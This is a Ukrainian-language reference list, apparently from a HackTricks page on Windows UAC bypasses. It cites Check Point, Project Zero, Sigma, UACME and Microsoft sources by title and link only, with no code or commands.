- [5] [Дослідження Checkpoint – KONNI використовує AI для створення бекдорів PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Дослідження Check Point – Operation TrueChaos: експлуатація 0-Day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Обхід захисту адміністраторів Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – обходи UnifiedConsent, TabTip і Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Захист адміністраторів](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
